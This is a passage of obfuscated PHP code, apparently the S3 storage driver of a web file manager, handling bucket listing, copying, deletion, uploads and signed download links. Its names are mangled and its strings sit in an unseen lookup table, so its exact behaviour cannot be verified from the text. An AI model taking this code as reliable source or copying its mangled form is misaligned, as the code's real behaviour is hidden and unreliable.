strlen($¬¬åöÌş)); $¾íÛ‘× = $™ÍˆŠĞ¡ . "\x28{$¨—Ó¼ˆ—}\x29{$¬¬åöÌş}"; while ($this->exist(rtrim($ğ—ªÃº, $Ë”µó›Ù[8]) . $Ë”µó›Ù[8] . $¾íÛ‘×)) { $¾íÛ‘× = $™ÍˆŠĞ¡ . "\x28{$¨—Ó¼ˆ—}\x29{$¬¬åöÌş}"; $¨—Ó¼ˆ—++; } return $¾íÛ‘×; } private function fileNameAutoList($®Æ·ó§á, $ËÙÏ•óƒ, $ÆªˆŸ¥ì = false) { $ïˆÄçİğ =& $_SERVER[¿ğÚ‰±–]; $•ø¾‰Âˆ = $this->listPath($®Æ·ó§á, !0); $•ø¾‰Âˆ = array_merge($•ø¾‰Âˆ[$ïˆÄçİğ[85]], $•ø¾‰Âˆ[$ïˆÄçİğ[86]]); $Òôë· = array_to_keyvalue($•ø¾‰Âˆ, $ïˆÄçİğ[12], $ïˆÄçİğ[32]); $±–€ûÓç = $ïˆÄçİğ[10] . get_path_ext($ËÙÏ•óƒ); $±–€ûÓç = $±–€ûÓç == $ïˆÄçİğ[10] || $ÆªˆŸ¥ì ? $ïˆÄçİğ[12] : $±–€ûÓç; $Ë€Ñ÷È = substr($ËÙÏ•óƒ, 0, strlen($ËÙÏ•óƒ) - strlen($±–€ûÓç)); $ÛÃõ¨û„ = $Ë€Ñ÷È . "\x28\60\51{$±–€ûÓç}"; for ($ğƒùï‡™ = 1; $ğƒùï‡™ <= count($Òôë·) + 1; $ğƒùï‡™++) { $ÛÃõ¨û„ = $Ë€Ñ÷È . "\50{$ğƒùï‡™}\x29{$±–€ûÓç}"; if (!in_array_not_case($ÛÃõ¨û„, $Òôë·)) { return $ÛÃõ¨û„; } } return $ÛÃõ¨û„; } public function listAllFiles($Çˆúşõè, $—¹üİ†§) { $ ë‘ÃšÕ =& $_SERVER[¿ğÚ‰±–]; if (empty($—¹üİ†§)) { return array(); } $Õö£½¹æ = array_keys($—¹üİ†§); $üø¨îòÖ = array(); $Çˆúşõè = trim($Çˆúşõè, $ ë‘ÃšÕ[8]); foreach ($—¹üİ†§ as $‘½¡Ã» => $‘‡Ó¬²Ğ) { $íøïÄ²¥ = ltrim(substr(trim($‘½¡Ã», $ ë‘ÃšÕ[8]), strlen($Çˆúşõè)), $ ë‘ÃšÕ[8]); if (substr($‘½¡Ã», -1) == $ ë‘ÃšÕ[8]) { $íøïÄ²¥ = rtrim($íøïÄ²¥, $ ë‘ÃšÕ[8]) . $ ë‘ÃšÕ[8]; } $üø¨îòÖ = array_merge($üø¨îòÖ, $this->slicePath($íøïÄ²¥)); } $‘–¦€í = array(); foreach (array_unique($üø¨îòÖ) as $¸¹ŠÎ¹) { $Ğ€Úùö = array($ ë‘ÃšÕ[87] => $this->getPathOuter($ ë‘ÃšÕ[8] . $Çˆúşõè . $ ë‘ÃšÕ[8] . $¸¹ŠÎ¹), $ ë‘ÃšÕ[78] => 1, $ ë‘ÃšÕ[79] => 0); if (substr($¸¹ŠÎ¹, -1) != $ ë‘ÃšÕ[8]) { $Ğ€Úùö[$ ë‘ÃšÕ[78]] = 0; $õ’µÒ£Ü = $this->getPath($Çˆúşõè . $ ë‘ÃšÕ[8] . $¸¹ŠÎ¹); if (isset($—¹üİ†§[$õ’µÒ£Ü])) { $•ü»œÁû = $—¹üİ†§[$õ’µÒ£Ü]; if (isset($•ü»œÁû[$ ë‘ÃšÕ[79]])) { $Ğ€Úùö[$ ë‘ÃšÕ[79]] = intval($•ü»œÁû[$ ë‘ÃšÕ[79]]); } if (isset($•ü»œÁû[$ ë‘ÃšÕ[206]])) { $Ğ€Úùö[$ ë‘ÃšÕ[88]] = intval($•ü»œÁû[$ ë‘ÃšÕ[206]]); } } } $‘–¦€í[] = $Ğ€Úùö; } return $‘–¦€í; } public function slicePath($ŒŠğ‰êĞ) { $×ôúŸ =& $_SERVER[¿ğÚ‰±–]; $„‹£ñ = explode($×ôúŸ[8], trim($ŒŠğ‰êĞ, $×ôúŸ[8])); $¬»Ç”à´ = 0; do { ++$¬»Ç”à´; $¢ÏÁÈ˜–[] = implode($×ôúŸ[8], array_slice($„‹£ñ, 0, $¬»Ç”à´)) . $×ôúŸ[8]; } while ($¬»Ç”à´ < count($„‹£ñ)); $¢ÏÁÈ˜–[count($„‹£ñ) - 1] = $ŒŠğ‰êĞ; return $¢ÏÁÈ˜–; } public function getHost() { $êõ‰´“÷ =& $_SERVER[¿ğÚ‰±–]; $©´üÜ© = parse_url(trim($this->domain, $êõ‰´“÷[8])); $öÊçõà˜ = isset($©´üÜ©[$êõ‰´“÷[207]]) ? $©´üÜ©[$êõ‰´“÷[207]] : http_type(); $Ãä§Ò‘€ = isset($©´üÜ©[$êõ‰´“÷[208]]) ? $©´üÜ©[$êõ‰´“÷[208]] : $©´üÜ©[$êõ‰´“÷[87]]; if (isset($©´üÜ©[$êõ‰´“÷[209]])) { $Ãä§Ò‘€ .= $êõ‰´“÷[4] . $©´üÜ©[$êõ‰´“÷[209]]; } return $öÊçõà˜ . $êõ‰´“÷[210] . $Ãä§Ò‘€; } public function pathEncode($¯ƒÙõş) { $Ó²ç¬®¯ =& $_SERVER[¿ğÚ‰±–]; return str_replace($Ó²ç¬®¯[211], $Ó²ç¬®¯[8], rawurlencode($¯ƒÙõş)); } public function writeLog($¾æÙ—ú = '', $ÆúÑ¿«¦ = false) { $üˆã²Â =& $_SERVER[¿ğÚ‰±–]; $‘—Ùú¯ = in_array(ACTION, array($üˆã²Â[212], $üˆã²Â[213])); if (!$‘—Ùú¯ && !GLOBAL_DEBUG) { return; } $¢‡ñ€× = $¾æÙ—ú; static $òĞËÜ¾ğ = null; if (!$òĞËÜ¾ğ) { $òĞËÜ¾ğ = strtoupper($this->getType()); } $¾æÙ—ú = $òĞËÜ¾ğ . $üˆã²Â[214] . $¾æÙ—ú; if ($ÆúÑ¿«¦) { $Ç¹ú¨„¬ = error_get_last(); if ($Ç¹ú¨„¬) { $¾æÙ—ú = array($¾æÙ—ú, $Ç¹ú¨„¬); } } write_log($¾æÙ—ú, $üˆã²Â[215]); if ($‘—Ùú¯) { throw new Exception($¢‡ñ€×); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($‰Ò£ÂŞú) { set_timeout(); require_once SDK_DIR . $_SERVER[¿ğÚ‰±–][216]; parent::__construct(); $this->_init($‰Ò£ÂŞú); } public function _init($¹ü¡³Û) { $Ì­Æ’í£ =& $_SERVER[¿ğÚ‰±–]; $this->config = $¹ü¡³Û; foreach ($¹ü¡³Û as $Ó±°õ†á => $€ğÃğ¸) { if (isset($this->{$Ó±°õ†á})) { $this->{$Ó±°õ†á} = $€ğÃğ¸; } } $this->endpoint = $¹ü¡³Û[$Ì­Æ’í£[217]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); if (in_array(ACTION, array($Ì­Æ’í£[212], $Ì­Æ’í£[213]))) { $this->client->setExceptions(); } } public function setSignVersion($úÔŞÑïú = "\166\x34") { $this->signVer = $úÔŞÑïú; $this->client->setSignatureVersion($úÔŞÑïú); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $®¶–½öˆ) { return null; } } public function isBucketCors() { $ší¸ºÛà =& $_SERVER[¿ğÚ‰±–]; $€Í‚¾Õ° = $this->getBucketCors(); if (!$€Í‚¾Õ° || !is_array($€Í‚¾Õ°)) { return !1; } if (!is_array($€Í‚¾Õ°[$ší¸ºÛà[218]])) { $€Í‚¾Õ°[$ší¸ºÛà[218]] = explode($ší¸ºÛà[50], $€Í‚¾Õ°[$ší¸ºÛà[218]]); } if ($€Í‚¾Õ°[$ší¸ºÛà[219]] != $ší¸ºÛà[220] || !in_array($ší¸ºÛà[220], $€Í‚¾Õ°[$ší¸ºÛà[218]])) { return !1; } $¡ÄŸÉÑ = array_map($ší¸ºÛà[221], $€Í‚¾Õ°[$ší¸ºÛà[222]]); if (!is_array($¡ÄŸÉÑ)) { $¡ÄŸÉÑ = array(); } $Ä—úöœ = array($ší¸ºÛà[223], $ší¸ºÛà[224], $ší¸ºÛà[225], $ší¸ºÛà[226], $ší¸ºÛà[227]); $ìüÜÃö = array_diff($Ä—úöœ, $¡ÄŸÉÑ); return empty($ìüÜÃö); } public function getBucketRgn() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($Ø´¥î“, $¿Ÿšõ¤˜ = '', $Ş™ù°‰Â = REPEAT_RENAME) { $ÔôÍ¢ë = $this->setContent($Ø´¥î“, $¿Ÿšõ¤˜); if ($ÔôÍ¢ë !== !1) { return $this->getPathOuter($Ø´¥î“); } return !1; } public function mkdir($¾—ã×†, $îí±­‡ğ = REPEAT_SKIP) { $î¶¬¤ç =& $_SERVER[¿ğÚ‰±–]; if (empty($¾—ã×†) && $¾—ã×† !== $î¶¬¤ç[228]) { return !1; } if ($îí±­‡ğ && $this->_isFolder($¾—ã×†)) { return $this->getPathOuter($¾—ã×†); } $×ßçóíœ = $this->setContent($¾—ã×†, $î¶¬¤ç[12], !0); if ($×ßçóíœ !== !1) { return $this->getPathOuter($¾—ã×†); } return !1; } public function copyFile($¢™ß›Ø, $ª–îÈµñ, $À«ÓÉ³ = array()) { $‰îü×Ôü =& $_SERVER[¿ğÚ‰±–]; $€áù = $this->objectMeta($¢™ß›Ø); if (!$€áù) { return !1; } if ($€áù[$‰îü×Ôü[79]] <= 1024 * 1024 * 200) { $ÍÓ¶£Íµ = $this->client->copyObject($this->bucket, $¢™ß›Ø, $this->bucket, $ª–îÈµñ, $‰îü×Ôü[229], $À«ÓÉ³); } else { $ÍÓ¶£Íµ = $this->client->multiCopyObject($this->bucket, $¢™ß›Ø, $this->bucket, $ª–îÈµñ, $À«ÓÉ³); } $ÍÓ¶£Íµ = $ÍÓ¶£Íµ ? $this->getPathOuter($ª–îÈµñ) : !1; return $ÍÓ¶£Íµ; } public function moveFile($¶²ï­­ê, $§Æ¡ÍåÃ) { if ($this->copyFile($¶²ï­­ê, $§Æ¡ÍåÃ)) { $this->delFile($¶²ï­­ê); return $this->getPathOuter($§Æ¡ÍåÃ); } return !1; } public function delFile($Èºüã÷¤) { return $this->client->deleteObject($this->bucket, $Èºüã÷¤); } public function delFolder($¬Á–çÇË) { $ÙĞ»Şõö =& $_SERVER[¿ğÚ‰±–]; if (!$this->exist($¬Á–çÇË)) { return !0; } $this->listItemCache = !1; $”ûŸóÓƒ = $this->fileList($¬Á–çÇË); $this->listItemCache = !0; $å×ÂµÊÒ = trim($¬Á–çÇË, $ÙĞ»Şõö[8]) . $ÙĞ»Şõö[8]; if (!empty($¬Á–çÇË) && $¬Á–çÇË !== $ÙĞ»Şõö[228] && !in_array($å×ÂµÊÒ, $”ûŸóÓƒ[$ÙĞ»Şõö[85]])) { $”ûŸóÓƒ[$ÙĞ»Şõö[85]][] = $å×ÂµÊÒ; } $½îÉş• = $this->delByBatch($”ûŸóÓƒ[$ÙĞ»Şõö[86]]); if (!$½îÉş•) { return !1; } $½îÉş• = $this->delByBatch($”ûŸóÓƒ[$ÙĞ»Şõö[85]]); if (!$½îÉş•) { return !1; } return $this->delFile($å×ÂµÊÒ); } private function delByBatch($‘ÙÙ÷) { foreach (array_chunk($‘ÙÙ÷, 1000) as $³ËŠÊ™Á) { $®¦î‡™¼ = $this->client->deleteObjects($this->bucket, $³ËŠÊ™Á); if (!$®¦î‡™¼) { return !1; } } return !0; } public function rename($À¥œ×à, $½è’Â…) { return $this->renameObject($À¥œ×à, $½è’Â…); } public function listPath($¿™ƒ’ë¿, $û›Ş÷—É = false) { $íÏ“Ñ‰ =& $_SERVER[¿ğÚ‰±–]; $×¶¨âÀ² = $this->fileList($¿™ƒ’ë¿, $íÏ“Ñ‰[8], !0); foreach ($×¶¨âÀ²[$íÏ“Ñ‰[85]] as $Ú Ûõ¨ô => $Å€¥Ÿå´) { $×¶¨âÀ²[$íÏ“Ñ‰[85]][$Ú Ûõ¨ô] = $this->folderInfo($Å€¥Ÿå´, $û›Ş÷—É, $Å€¥Ÿå´); } foreach ($×¶¨âÀ²[$íÏ“Ñ‰[86]] as $Ú Ûõ¨ô => $Å€¥Ÿå´) { $×¶¨âÀ²[$íÏ“Ñ‰[86]][$Ú Ûõ¨ô] = $this->fileInfo($Å€¥Ÿå´[$íÏ“Ñ‰[32]], $û›Ş÷—É, $Å€¥Ÿå´); } return $×¶¨âÀ²; } protected function infoChildren($û”Ïèù, &$ğ’›Ãì) { $´·ŸÇÚó =& $_SERVER[¿ğÚ‰±–]; $¦°œ¿í = $this->fileList($û”Ïèù, $´·ŸÇÚó[12], !0); $ğ’›Ãì[$´·ŸÇÚó[81]] += count($¦°œ¿í[$´·ŸÇÚó[85]]); $ğ’›Ãì[$´·ŸÇÚó[80]] += count($¦°œ¿í[$´·ŸÇÚó[86]]); foreach ($¦°œ¿í[$´·ŸÇÚó[86]] as $ÕÃôáÓÇ) { if (!$ÕÃôáÓÇ || !$ÕÃôáÓÇ[$´·ŸÇÚó[79]]) { continue; } $ğ’›Ãì[$´·ŸÇÚó[79]] += $ÕÃôáÓÇ[$´·ŸÇÚó[79]]; } } private function fileInfo($€€Í®ï, $–¹¸¾• = false, $úßÄù› = array()) { $û¶¸üÅ­ =& $_SERVER[¿ğÚ‰±–]; $¡ºÓ¡ß« = array($û¶¸üÅ­[32] => $this->pathThis($€€Í®ï), $û¶¸üÅ­[87] => $this->getPathOuter($€€Í®ï), $û¶¸üÅ­[33] => $û¶¸üÅ­[230], $û¶¸üÅ­[169] => $this->ext($€€Í®ï), $û¶¸üÅ­[79] => isset($úßÄù›[$û¶¸üÅ­[79]]) ? $úßÄù›[$û¶¸üÅ­[79]] : 0); if ($–¹¸¾•) { return $¡ºÓ¡ß«; } $¡ºÓ¡ß«[$û¶¸üÅ­[231]] = $¡ºÓ¡ß«[$û¶¸üÅ­[88]] = 0; $¡ºÓ¡ß«[$û¶¸üÅ­[232]] = $¡ºÓ¡ß«[$û¶¸üÅ­[233]] = !0; if (empty($úßÄù›)) { $úßÄù› = $this->objectMeta($€€Í®ï); if (!$úßÄù›) { return $¡ºÓ¡ß«; } } if (isset($úßÄù›[$û¶¸üÅ­[234]]) && $úßÄù›[$û¶¸üÅ­[234]]) { $¡ºÓ¡ß«[$û¶¸üÅ­[235]] = $úßÄù›[$û¶¸üÅ­[234]]; } if (isset($úßÄù›[$û¶¸üÅ­[206]])) { $¡ºÓ¡ß«[$û¶¸üÅ­[88]] = $úßÄù›[$û¶¸üÅ­[206]]; } if (isset($úßÄù›[$û¶¸üÅ­[79]])) { $¡ºÓ¡ß«[$û¶¸üÅ­[79]] = $úßÄù›[$û¶¸üÅ­[79]]; } return $¡ºÓ¡ß«; } private function folderInfo($ÖÜåå€£, $¤÷ÜÚüÒ = false, $«ÒïùÀÔ = array()) { $¥š¿ÅÛü =& $_SERVER[¿ğÚ‰±–]; $«á¡±úÇ = array($¥š¿ÅÛü[32] => $this->pathThis($ÖÜåå€£), $¥š¿ÅÛü[87] => $this->getPathOuter($¥š¿ÅÛü[8] . $ÖÜåå€£), $¥š¿ÅÛü[33] => $¥š¿ÅÛü[78]); if ($¤÷ÜÚüÒ) { return $«á¡±úÇ; } $«á¡±úÇ[$¥š¿ÅÛü[231]] = $«á¡±úÇ[$¥š¿ÅÛü[88]] = 0; $«á¡±úÇ[$¥š¿ÅÛü[232]] = $«á¡±úÇ[$¥š¿ÅÛü[233]] = !0; if ($ÖÜåå€£ == $¥š¿ÅÛü[12]) { return $«á¡±úÇ; } if (empty($«ÒïùÀÔ)) { $«ÒïùÀÔ = $this->objectMeta(trim($ÖÜåå€£, $¥š¿ÅÛü[8]) . $¥š¿ÅÛü[8]); } if (isset($«ÒïùÀÔ[$¥š¿ÅÛü[206]])) { $«á¡±úÇ[$¥š¿ÅÛü[231]] = $«ÒïùÀÔ[$¥š¿ÅÛü[206]]; } return $«á¡±úÇ; } private function fileList($¥‚ ”âæ, $¤°¬òâ = '', $Ì–øç°´ = 0) { $ö”ó­…º =& $_SERVER[¿ğÚ‰±–]; $ÇåÍ¸ûÛ = rtrim($¥‚ ”âæ, $ö”ó­…º[8]) . $ö”ó­…º[8]; $’ç¦¤æ = $this->listObjs($ÇåÍ¸ûÛ, null, null, $¤°¬òâ); if (!$’ç¦¤æ) { return array($ö”ó­…º[85] => array(), $ö”ó­…º[86] => array()); } $»…¹à¤¯ = $ãµœ‘° = array(); foreach ($’ç¦¤æ[$ö”ó­…º[236]] as $¿§Ë—ÉÜ) { $»¢âÍÀŞ = $¿§Ë—ÉÜ[$ö”ó­…º[32]]; if ($»¢âÍÀŞ == $ÇåÍ¸ûÛ) { continue; } $º³˜ôë = isset($¿§Ë—ÉÜ[$ö”ó­…º[79]]) ? $¿§Ë—ÉÜ[$ö”ó­…º[79]] : 0; $ˆúÛ…ò = $º³˜ôë == 0 && substr($»¢âÍÀŞ, strlen($»¢âÍÀŞ) - 1, 1) == $ö”ó­…º[8] ? !0 : !1; $this->cacheMethodInfoSet($»¢âÍÀŞ, $ˆúÛ…ò, $¿§Ë—ÉÜ); if ($ˆúÛ…ò) { $»…¹à¤¯[] = $»¢âÍÀŞ; continue; } $ãµœ‘°[] = $Ì–øç°´ ? $¿§Ë—ÉÜ : $»¢âÍÀŞ; } foreach ($’ç¦¤æ[$ö”ó­…º[237]] as $¿§Ë—ÉÜ) { $»…¹à¤¯[] = $¿§Ë—ÉÜ[$ö”ó­…º[32]]; $this->cacheMethodInfoSet($¿§Ë—ÉÜ[$ö”ó­…º[32]], !0); } $this->cacheMethodInfoSet($¥‚ ”âæ, !0); return array($ö”ó­…º[85] => $»…¹à¤¯, $ö”ó­…º[86] => $ãµœ‘°); } private function listObjs($´É–†™±, $¤„„Ìâç = null, $Ï¤î£É = null, $¡”ìœ–Ñ = null) { $ì¢¼×‡ =& $_SERVER[¿ğÚ‰±–]; $´É–†™± = trim($´É–†™±, $ì¢¼×‡[8]); $Èœ”ôƒ = empty($´É–†™±) && $´É–†™± !== $ì¢¼×‡[228] ? $ì¢¼×‡[12] : $´É–†™± . $ì¢¼×‡[8]; return $this->client->getBucket($this->bucket, $Èœ”ôƒ, $¤„„Ìâç, $Ï¤î£É, $¡”ìœ–Ñ, !0); } public function has($‚˜àâÚ, $ä…ôÛ±† = false, $‹¹å÷úš = true) { $ª¦ÍÊ“ =& $_SERVER[¿ğÚ‰±–]; $‚˜àâÚ = trim($‚˜àâÚ, $ª¦ÍÊ“[8]); $‡§‹óÄ› = empty($‚˜àâÚ) && $‚˜àâÚ !== $ª¦ÍÊ“[228] ? $ª¦ÍÊ“[12] : $‚˜àâÚ . $ª¦ÍÊ“[8]; $ÔÊ•½¦Û = null; $æ‰…—¡Ë = 500; $şŞî‰¦Õ = $ª¦ÍÊ“[8]; $ú£¤‡æ÷ = $â°ü”¯³ = array(); while (!0) { $±Ÿ“äÜõ = $this->listObjs($‚˜àâÚ, $ÔÊ•½¦Û, $æ‰…—¡Ë, $şŞî‰¦Õ); if (!$±Ÿ“äÜõ) { break; } $ÔÊ•½¦Û = $±Ÿ“äÜõ[$ª¦ÍÊ“[238]]; $»û·¤æ = $±Ÿ“äÜõ[$ª¦ÍÊ“[236]]; $Š¢§Œ¬ = $±Ÿ“äÜõ[$ª¦ÍÊ“[237]]; if (empty($»û·¤æ) && empty($Š¢§Œ¬)) { break; } if (count($»û·¤æ) == 1 && $»û·¤æ[0][$ª¦ÍÊ“[32]] == $‡§‹óÄ›) { break; } if ($ä…ôÛ±†) { if (count($»û·¤æ)) { $»û·¤æ = array_column($»û·¤æ, $ª¦ÍÊ“[32]); $ú£¤‡æ÷ = array_merge($ú£¤‡æ÷, $»û·¤æ); } if (count($Š¢§Œ¬)) { $Š¢§Œ¬ = array_column($Š¢§Œ¬, $ª¦ÍÊ“[32]); $â°ü”¯³ = array_merge($â°ü”¯³, $Š¢§Œ¬); } if ($ÔÊ•½¦Û === null) { break; } continue; } if ($‹¹å÷úš) { if (!empty($»û·¤æ)) { if (count($»û·¤æ) > 1 || isset($»û·¤æ[0][$ª¦ÍÊ“[32]]) && $»û·¤æ[0][$ª¦ÍÊ“[32]] != $‡§‹óÄ›) { return !0; } } } else { if (!empty($Š¢§Œ¬)) { return !0; } } if ($ÔÊ•½¦Û === null) { break; } } if ($ä…ôÛ±†) { $ú£¤‡æ÷ = array_diff($ú£¤‡æ÷, array($‡§‹óÄ›)); $ú£¤‡æ÷ = count(array_unique($ú£¤‡æ÷)); $â°ü”¯³ = count(array_unique($â°ü”¯³)); return array($ª¦ÍÊ“[239] => $ú£¤‡æ÷, $ª¦ÍÊ“[240] => $â°ü”¯³); } return !1; } public function listAll($Ì†ğÂÁú) { $õ°Ä“—Ò =& $_SERVER[¿ğÚ‰±–]; $ôË¦ÎÊ = $this->fileList($Ì†ğÂÁú, $õ°Ä“—Ò[12], !0); $¬˜Íàƒ™ = array_to_keyvalue($ôË¦ÎÊ[$õ°Ä“—Ò[86]], $õ°Ä“—Ò[32]); foreach ($ôË¦ÎÊ[$õ°Ä“—Ò[85]] as $Â§İ«âÀ) { if (is_string($Â§İ«âÀ)) { $¬˜Íàƒ™[$Â§İ«âÀ] = array($õ°Ä“—Ò[79] => 0); } } return $this->listAllFiles($Ì†ğÂÁú, $¬˜Íàƒ™); } public function canRead($ûùŠº¶) { $‰Í»æŠİ =& $_SERVER[¿ğÚ‰±–]; $íËÅÆê‰ = $this->client->getAccessControlPolicy($this->bucket, $ûùŠº¶); if (!$íËÅÆê‰) { return !1; } return in_array($íËÅÆê‰, array($‰Í»æŠİ[241], $‰Í»æŠİ[242], $‰Í»æŠİ[243])) ? !0 : !1; } public function canWrite($¿‰‚éáë) { $Ú’øÅ£× =& $_SERVER[¿ğÚ‰±–]; $ˆ™œäÇ• = $this->client->getAccessControlPolicy($this->bucket, $¿‰‚éáë); if (!$ˆ™œäÇ•) { return !1; } return in_array($ˆ™œäÇ•, array($Ú’øÅ£×[241], $Ú’øÅ£×[242])) ? !0 : !1; } public function getContent($î®¯ÌÔá) { return $this->client->getObject($this->bucket, $î®¯ÌÔá); } public function setContent($Ğª¦ù¤è, $ÃÄèŒ–× = '', $÷É’úŒ¿ = false) { $Ç‹„«Ãë =& $_SERVER[¿ğÚ‰±–]; $Ğª¦ù¤è = $÷É’úŒ¿ ? trim($Ğª¦ù¤è, $Ç‹„«Ãë[8]) . $Ç‹„«Ãë[8] : $Ğª¦ù¤è; $“ŒóˆÎ¨ = get_file_mime(get_path_ext($Ğª¦ù¤è)); $ìÅÃÛÓÊ = $this->client->putObject($ÃÄèŒ–×, $this->bucket, $Ğª¦ù¤è, $Ç‹„«Ãë[229], array(), $“ŒóˆÎ¨); if (!$ìÅÃÛÓÊ) { return !1; } if ($÷É’úŒ¿) { return !0; } return $ìÅÃÛÓÊ ? !0 : !1; } public function fileSubstr($­à—úÆ, $ïÃ±¹¶¸, $¶¾Û®—) { $éå®¨µ = $ïÃ±¹¶¸ + $¶¾Û®— - 1; return $this->client->getObject($this->bucket, $­à—úÆ, array($_SERVER[¿ğÚ‰±–][244] => "\142\171\164\145\163\75{$ïÃ±¹¶¸}\55{$éå®¨µ}")); } public function upload($İ÷´ÎÜú, $–àºäÆÂ, $éÎÒÍ€€ = false, $ƒÅòÑû™ = REPEAT_REPLACE) { $Æ“’¯óì =& $_SERVER[¿ğÚ‰±–]; $¬ƒ‘ËúÔ = array($Æ“’¯óì[245] => @md5_file($–àºäÆÂ)); $ıªÑûÌ = array($Æ“’¯óì[246] => get_file_mime(get_path_ext($İ÷´ÎÜú))); if (IO::size($–àºäÆÂ) <= 1024 * 1024 * 200) { $ÃÍŞ–èÇ = $this->client->putObjectFile($–àºäÆÂ, $this->bucket, $İ÷´ÎÜú, $Æ“’¯óì[229], $¬ƒ‘ËúÔ, $ıªÑûÌ); return !empty($ÃÍŞ–èÇ) ? $this->getPathOuter($İ÷´ÎÜú) : !1; } $Œ‹ÆøŠ = $this->client->multiUploadObject($–àºäÆÂ, $this->bucket, trim($İ÷´ÎÜú, $Æ“’¯óì[8]), $¬ƒ‘ËúÔ, $ıªÑûÌ); return $Œ‹ÆøŠ ? $this->getPathOuter($İ÷´ÎÜú) : !1; } public function download($à³Ä³ÄÕ, $ƒÒ…€÷) { if (!@is_dir($this->pathFather($ƒÒ…€÷)) && !IO::mkdir($this->pathFather($ƒÒ…€÷))) { return !1; } $ô¬ÜªŞ¥ = $this->client->getObject($this->bucket, $à³Ä³ÄÕ, array(), $ƒÒ…€÷); return $ô¬ÜªŞ¥ !== !1 ? $ƒÒ…€÷ : !1; } public function link($ôªÈ€§, $€ä¼¤’Ÿ = array()) { $ùãşØö• =& $_SERVER[¿ğÚ‰±–]; if ($this->signVer == $ùãşØö•[247]) { return $this->client->getAuthenticatedURL($this->bucket, $ôªÈ€§, 3600 * 12, $€ä¼¤’Ÿ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($ôªÈ€§, $ùãşØö•[8]), 3600 * 12, $this->region, array(), !0, $€ä¼¤’Ÿ); } public function fileOut($”Îç—Šê, $²£ìù»Î = false, $°æƒ½–¡ = false, $ÓÍïò÷ı = '') { $óíÍ™çŠ =& $_SERVER[¿ğÚ‰±–]; if ($this->isFileOutServer()) { return $this->fileOutServer($”Îç—Šê, $²£ìù»Î, $°æƒ½–¡, $ÓÍïò÷ı); } if (!$°æƒ½–¡) { $°æƒ½–¡ = $this->pathThis($”Îç—Šê); } $èàß“ï… = get_file_mime(get_path_ext($°æƒ½–¡)); if ($èàß“ï… == $óíÍ™çŠ[248]) { return parent::fileOut($”Îç—Šê, $²£ìù»Î, $°æƒ½–¡, $ÓÍïò÷ı); } $‡Ùàäú = array($óíÍ™çŠ[249] => $èàß“ï…); if ($²£ìù»Î) { $‡Ùàäú[$óíÍ™çŠ[250]] = $óíÍ™çŠ[251] . rawurlencode($°æƒ½–¡); } else { } $²Ò‚¥ºâ = $this->link($”Îç—Šê, $‡Ùàäú); $this->fileOutLink($²Ò‚¥ºâ); } public function fileOutServer($åï˜ğÛ†, $²¸êª© = false, $š¸ŠÈçß = false, $£¸…½İ¼ = '') { parent::fileOut($åï˜ğÛ†, $²¸êª©, $š¸ŠÈçß, $£¸…½İ¼); } public function fileOutImageServer($…·ˆú, $‡¦õÒ€Å = 250) { parent::fileOutImage($…·ˆú, $‡¦õÒ€Å); } public function hashMd5($ôú‡É¨, $÷¸µëÁÁ = '') { $ãÑ‰ó = $this->objectMeta($ôú‡É¨); if (!$ãÑ‰ó) { return !1; } $÷¸µëÁÁ = $÷¸µëÁÁ ? $÷¸µëÁÁ : _get($ãÑ‰ó, $_SERVER[¿ğÚ‰±–][252]); return $÷¸µëÁÁ; } public function uploadFormData($…öıã®–, $â•ş™ßè = 3600) { $ÇÏåÄë” =& $_SERVER[¿ğÚ‰±–]; $ôô„ÊÔ = $this->pathFather($…öıã®–); $Ì¸Ûİ‘Ú = $this->client->getHttpUploadPostParams($this->bucket, $ôô„ÊÔ, $ÇÏåÄë”[229], $â•ş™ßè); return array_merge((array) $Ì¸Ûİ‘Ú, array($ÇÏåÄë”[208] => $this->getHost())); } public function multiUploadFormData($•ÁÖî‰„, $ÌìºõÃ™ = 3600) { $£ª¤öñö =& $_SERVER[¿ğÚ‰±–]; $Æ—ëù·ü = gmdate($£ª¤öñö[253]); $ŠÛĞË†¬ = array(); $¥€¸È©¨ = $this->client->getUploadId($this->bucket, $•ÁÖî‰„, $ŠÛĞË†¬); if (!$¥€¸È©¨) { return !1; } return array($£ª¤öñö[254] => $¥€¸È©¨, $£ª¤öñö[208] => $this->getHost() . $£ª¤öñö[8] . $this->pathEncode($•ÁÖî‰„), $£ª¤öñö[255] => $Æ—ëù·ü, $£ª¤öñö[97] => $•ÁÖî‰„); } public function multiUploadAuthData($»³Õì…¼, $ãÔÖÓê = array()) { $©¥ıó“ë =& $_SERVER[¿ğÚ‰±–]; $ƒÛ¬ü¬Æ = isset($ãÔÖÓê[$©¥ıó“ë[255]]) ? $ãÔÖÓê[$©¥ıó“ë[255]] : gmdate($©¥ıó“ë[253]); $¡úŸ‡£Œ = isset($ãÔÖÓê[$©¥ıó“ë[169]]) ? $ãÔÖÓê[$©¥ıó“ë[169]] : $©¥ıó“ë[12]; $Ë”¤¡şğ = $ãÔÖÓê[$©¥ıó“ë[97]]; unset($ãÔÖÓê[$©¥ıó“ë[97]]); if (isset($ãÔÖÓê[$©¥ıó“ë[256]])) { $ãÔÖÓê[$©¥ıó“ë[255]] = $ƒÛ¬ü¬Æ; return $this->listUploadParts($Ë”¤¡şğ, $ãÔÖÓê); } $öÑ³à‡© = array($©¥ıó“ë[257], $©¥ıó“ë[12], $©¥ıó“ë[123], $©¥ıó“ë[12], "\x78\x2d\x61\x6d\x7a\x2d\x64\x61\164\145\72{$ƒÛ¬ü¬Æ}", $©¥ıó“ë[8] . $this->bucket . $©¥ıó“ë[8] . $this->pathEncode($Ë”¤¡şğ) . $¡úŸ‡£Œ); if (strpos($¡úŸ‡£Œ, $©¥ıó“ë[258]) === 0) { $öÑ³à‡©[0] = $©¥ıó“ë[259]; } if (isset($ãÔÖÓê[$©¥ıó“ë[260]]) && $ãÔÖÓê[$©¥ıó“ë[260]] == $©¥ıó“ë[261]) { $öÑ³à‡©[0] = $©¥ıó“ë[261]; } $›ïâõ—Ç = 